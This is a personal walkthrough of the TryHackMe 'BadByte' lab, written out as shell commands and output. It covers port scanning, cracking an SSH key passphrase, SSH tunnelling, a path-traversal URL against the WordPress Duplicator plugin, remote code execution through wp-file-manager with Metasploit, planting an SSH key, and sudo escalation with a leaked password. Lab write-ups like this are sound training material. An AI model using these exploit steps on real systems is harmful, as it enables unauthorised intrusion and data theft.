### Nmap

```
┌─[glack@parrot]─[~]
└──╼ $nmap -p- -T5  --min-rate=10000 10.10.78.166

PORT   STATE SERVICE
22/tcp open  ssh

```


after running above scans 3-4 time i get this


```
┌─[glack@parrot]─[~]
└──╼ $nmap -p 1-65535 -T5  --min-rate=10000 10.10.78.166

PORT      STATE SERVICE
22/tcp    open  ssh
30024/tcp open  unknown

```


- specific ports canning gives us this

```
┌─[glack@parrot]─[~]
└──╼ $nmap -sV -sT -A -p 22,30024 10.10.78.166

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

30024/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.24.189
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt

```


### FTP

- anonymous login allowed
- we get two files 
```
└──╼ $cat note.txt 
I always forget my password. Just let me store an ssh key here.
- errorcauser
```

- 2nd one is private RSA key

- private rsa key is passphrase protected

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/badbyte]
└──╼ $ssh errorcauser@10.10.78.166 -i id_rsa
Enter passphrase for key 'id_rsa':
```


### Shell

- using [[ssh2john]] to crack the passphrase

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/badbyte]
└──╼ $sudo python2 /usr/share/john/ssh2john.py id_rsa > forjohn.txt
```


```
┌─[glack@parrot]─[~/Desktop/THM/badbyte]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt
```

- we get a hit
`cupcake          (id_rsa)`

- However after getting a shell 
```
┌─[glack@parrot]─[~/Desktop/THM/badbyte]
└──╼ $ssh errorcauser@10.10.78.166 -i id_rsa
```

we are not able to run many commands as it is restricted

- I find a note with the contents
```
-bash-4.4$ cat note.txt
Hi Error!
I've set up a webserver locally so no one outside could access it.
It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
You can check it out, you already know what to do.
-Cth
:)

```

- in the `bin` directory we can see what commands we can run as shell user
```
-rwxr-xr-x 1 root root 1113504 Mar 23  2021 bash
-rwxr-xr-x 1 root root   35064 Mar 23  2021 cat
-rwxr-xr-x 1 root root  100568 Mar 23  2021 date
-rwxr-xr-x 1 root root  133792 Mar 23  2021 ls
```

- in `/etc/pass` we get 
```
root:x:0:0:root:/root:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
...
...
pollinate:x:109:1::/var/cache/pollinate:/bin/false
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

- in `group` file i find this `lxd:x:108:cth`


- Here read the THM questions and learnt about port forwarding using SSH
[[SSH - port forwarding]]

- added content in my `sudo mousepad /etc/proxychains.conf`

    commented out ``socks4 127.0.0.1 9050``

    added this ``socks5 127.0.0.1 1337``


- now as per THM room content, i should have found 80 port open when running
``proxychains nmap -sT 127.0.0.1``

but i got nothing

- used this writeup 

https://infosecwriteups.com/tryhackme-badbyte-walkthrough-6ed68d2d0116


- identified where i went wrong, after making changes in `/etc/proxychains.conf` 

we had to establish ssh connect using dynamic port forwarding using

```
┌─[glack@parrot]─[~/Desktop/THM/badbyte]
└──╼ $ssh errorcauser@10.10.78.166 -i id_rsa -D 1337

```

and then run the scan

```
┌─[glack@parrot]─[/etc]
└──╼ $sudo proxychains nmap -sT 127.0.0.1
```

we wait for few minutes, then we get his

```
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

- Followed the writeup and ran
```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/badbyte]
└──╼ $sudo ssh errorcauser@10.10.244.247 -i id_rsa -L 8080:127.0.0.1:80
```

I think this means that what is running on `10.10.78.166:80` we will be able to view it on `127.0.0.1:8080` due to ssh tunnel port forwarding

- i am able to load this into the browser `http://127.0.0.1:8080/`

- also get a login page at `http://127.0.0.1:8080/wp-login.php`

- nothing much useful using `wpscan`, except this
```
User(s) Identified:
[+] cth
```

- as per THM, we use nmap to find installed and vulnerable plugins
```
┌─[glack@parrot]─[~]
└──╼ $nmap --script http-wordpress-enum --script-args search-limit=1500 -p 8080 127.0.0.1
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-09 23:03 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).

PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-wordpress-enum: 
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0

```


- google both of the plugins vulnerability exploits 
- used this `auxiliary(scanner/http/wp_duplicator_file_read)` metasploit module to check and got the contents of `/etc/passwd` 

- just to check i set my file path to `set FILEPATH /home/cth/user.txt`
and got the output as well `THM{227906201d17d9c45aa93d0122ea1af7}`


- For manual exploitation , read this exploit `https://www.exploit-db.com/exploits/50420`, all we we have to do is change directory path to 
```
http://127.0.0.1:8080//wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../../etc/passwd
```

and we can download a file with the contents of `/etc/passwd`


- For manual exploitation of RCE used this exploit

https://www.exploit-db.com/exploits/49178


this did not work so used this https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213/tree/main



- manual exploit was giving error, now using this `exploit(multi/http/wp_file_manager_rce`
 after adding options and running the exploit i get a meterpreter shell open

and the user flag

```
(Meterpreter 1)(/home/cth) > cat user.txt
THM{227906201d17d9c45aa93d0122ea1af7}
```

```
(Meterpreter 1)(/home/errorcauser) > getuid
Server username: cth

```

```
(Meterpreter 1)(/home/errorcauser) > shell
Process 1378 created.
Channel 1 created.
id
uid=1000(cth) gid=1000(cth) groups=1000(cth),27(sudo)

```

- another method using rsa key found in one of the writeups 

`To get a better shell, I copied my public key on the server and reconnected using ssh.

```
mkdir .ssh
echo "ssh-rsa SSH KEY" > .ssh/authorized_keys
chmod 700 .ssh
chmod 600 .ssh/authorized_keys

# From my machine
ssh cth@target
```


- i did not find any writeup without the metasploit and my manual exploitation was also not working so continue with metasploit shell

```
(Meterpreter 1)(/home/errorcauser) > shell
Process 1438 created.
Channel 2 created.
id
uid=1000(cth) gid=1000(cth) groups=1000(cth),27(sudo)

```


```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


### Priv Esc

- found nothing in `sudo` , `suid`, `crontab`, `capabilities`
- tried to find all the files owner by `cth ` user using 
`cth@badbyte:/home$ find / -user cth -ls 2>/dev/null`

found an unusual file in the last `/var/log/bash.log`


found this in it `cth@badbyte:~$ G00dP@$sw0rd2020`

- tried this password to find `sudo` command by it said wrong password, so i changed the year to `2021` and it worked

```
sudo -l
[sudo] password for cth: G00dP@$sw0rd2020

Sorry, try again.
[sudo] password for cth: G00dP@$sw0rd2021

User cth may run the following commands on badbyte:
    (ALL : ALL) ALL
```


and i got root shell


```
cth@badbyte:/var/log$ sudo su
sudo su
root@badbyte:/var/log# id
id
uid=0(root) gid=0(root) groups=0(root)
```

and the flag
```
THM{ad485b44f63393b6a9225974909da5fa}
```